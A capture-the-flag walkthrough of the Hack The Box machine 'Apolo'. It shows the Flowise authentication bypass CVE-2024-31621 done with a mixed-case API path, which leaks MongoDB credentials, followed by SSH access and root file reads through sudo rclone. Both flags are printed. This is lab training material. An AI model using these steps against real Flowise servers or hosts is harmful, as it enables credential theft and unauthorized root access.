![](assets/images/banner.png)


<font size="10">Apolo</font>
15<sup>th</sup> December 2024

### Difficulty:

`Very Easy`

### Flags:

User: `HTB{llm_ex9l01t_4_RC3}`

Root: `HTB{cl0n3_rc3_f1l3}`

# Enumeration
Using `curl`, I probed the IP address `10.129.231.24` and observed a redirection to `apolo.htb`:
```
seclzi@anonymous:~$ curl http://10.129.231.24 -v
*   Trying 10.129.231.24:80...
* Connected to 10.129.231.24 (10.129.231.24) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.129.231.24
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.18.0 (Ubuntu)
< Date: Mon, 16 Dec 2024 09:59:00 GMT
< Content-Type: text/html
< Content-Length: 154
< Connection: keep-alive
< Location: http://apolo.htb/
< 
<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host 10.129.231.24 left intact
```
The server responded with a **302 Found** status, redirecting me to `apolo.htb`. To proceed, I added the domain `apolo.htb` to the `/etc/hosts` file for local resolution.

#### Nmap Scan
Next, I conducted a detailed scan using `nmap`:
```
seclzi@anonymous:~$ sudo nmap -sC -sV -sS apolo.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:06 WIB
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 17:07 (0:00:06 remaining)
Nmap scan report for apolo.htb (10.129.231.24)
Host is up (0.067s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Apolo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds
```

The scan revealed two open ports:

- **Port 22 (SSH):** OpenSSH 8.2p1
- **Port 80 (HTTP):** Nginx 1.18.0 (Ubuntu)

#### Subdomain Discovery

Examining the web page's source code, I found a subdomain `ai.apolo.htb`. To access it, I added this subdomain to the `/etc/hosts` file.

Upon visiting `ai.apolo.htb`, I gathered the following details:

- The subdomain is powered by **FlowiseAI**, a platform with a known vulnerability.
- Access to the AI interface requires login credentials.

---

![[assets/images/Pasted image 20241216171139.png]]

![[assets/images/Pasted image 20241216171721.png]]
#### Observations

The initial enumeration uncovered two critical pieces of information:

1. **Vulnerability in FlowiseAI:** A known authentication bypass vulnerability (CVE-2024-31621) could potentially be exploited.
2. **Host Configuration:** The server is running on an Ubuntu Linux system with services accessible through SSH and HTTP.

These findings set the stage for further exploitation of the FlowiseAI platform.
# Foothold

![[assets/images/Pasted image 20241216172037.png]]
While researching Flowise, I discovered that versions <= 1.6.5 are vulnerable to a known issue listed as `CVE-2024-31621`.
### CVE-2024-31621: Flowise 1.6.5 - Authentication Bypass Vulnerability

#### **Overview**
Flowise version <= 1.6.5 is vulnerable to an **authentication bypass vulnerability** due to improper handling of **case sensitivity** in the authentication middleware.

---

### **Vulnerability Description**
The vulnerability lies in the following code snippet:

```javascript
this.app.use((req, res, next) => {
    if (req.url.includes('/api/v1/')) {
        whitelistURLs.some((url) => req.url.includes(url)) ?
        next() : basicAuthMiddleware(req, res, next)
    } else next()
});
```
### **Logic Flaw**
- The middleware checks if the URL contains `/api/v1/` (in lowercase) to enforce authentication, except for specific **whitelisted endpoints**.
- This check is **case-sensitive**, meaning uppercase variations of the URL (e.g., `/API/V1` or `/Api/v1`) bypass the authentication middleware.

### **EXPLOIT PoC**
I exploited this vulnerability by targeting the `/Api/v1/credentials` endpoint:
```
seclzi@anonymous:~$ curl http://ai.apolo.htb/Api/v1/credentials
```
**Output:**
```
[{"id":"6cfda83a-b055-4fd8-a040-57e5f1dae2eb","name":"MongoDB","credentialName":"mongoDBUrlApi","createdDate":"2024-11-14T09:02:56.000Z","updatedDate":"2024-11-14T09:02:56.000Z"}]
```
The endpoint revealed a credentials ID. Next, I accessed the credentials directly using the extracted ID:
`seclzi@anonymous:~$ curl http://ai.apolo.htb/Api/v1/credentials/6cfda83a-b055-4fd8-a040-57e5f1dae2eb`
**Output:**
`{"id":"6cfda83a-b055-4fd8-a040-57e5f1dae2eb","name":"MongoDB","credentialName":"mongoDBUrlApi","createdDate":"2024-11-14T09:02:56.000Z","updatedDate":"2024-11-14T09:02:56.000Z","plainDataObj":{"mongoDBConnectUrl":"mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true&w=majority"}}`

---

### **Accessing the Shell**

The `mongoDBConnectUrl` revealed the username `lewis` and password `C0mpl3xi3Ty!_W1n3`. I used these credentials to attempt SSH access.
![[assets/images/Pasted image 20241216173546.png]]
Bingo, we get the user !!!
# Lateral Movement
After gaining access to the user `lewis`, I enumerated their `sudo` privileges using `sudo -l` and discovered the following:

```
lewis@apolo:~$ sudo -l
Matching Defaults entries for lewis on apolo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lewis may run the following commands on apolo:
    (ALL : ALL) NOPASSWD: /usr/bin/rclone
```

This indicated that `lewis` could execute the `rclone` command as root without a password. I leveraged this privilege to copy the `root.txt` flag from the `/root/` directory into my accessible `/home/lewis/` directory.

#### Exploitation Steps:

1. Used the following command to copy the `root.txt` file:
```
	lewis@apolo:~$ sudo rclone copy /root/root.txt /home/lewis/root.txt 
	
	2024/12/16 10:36:49 NOTICE: Config file "/root/.config/rclone/rclone.conf" not found - using defaults
```

2. Verified the presence of the `root.txt` file in my home directory:
    
```
	lewis@apolo:~$ ls -la
	total 32
	drwxr-xr-x 4 lewis lewis 4096 Dec 16 10:36 .
	drwxr-xr-x 3 root  root  4096 Oct 28 11:34 ..
	lrwxrwxrwx 1 root  root     9 Dec  4 07:17 .bash_history -> /dev/null
	-rw-r--r-- 1 lewis lewis  220 Oct 28 11:34 .bash_logout
	-rw-r--r-- 1 lewis lewis 3771 Oct 28 11:34 .bashrc
	drwx------ 2 lewis lewis 4096 Nov 14 07:33 .cache
	-rw-r--r-- 1 lewis lewis  807 Oct 28 11:34 .profile
	drwxr-xr-x 2 root  root  4096 Dec 16 10:36 root.txt
	-rw-r----- 1 root  lewis   23 Nov 21 08:54 user.txt
```

    
3. Finally, I read the contents of the flag:
    
    ```
	lewis@apolo:~$ cat root.txt/root.txt && cat user.txt 
	HTB{cl0n3_rc3_f1l3}
	HTB{llm_ex9l01t_4_RC3}
	```
    

Bingo! The `root.txt` and `user.txt` flag was successfully retrieved.
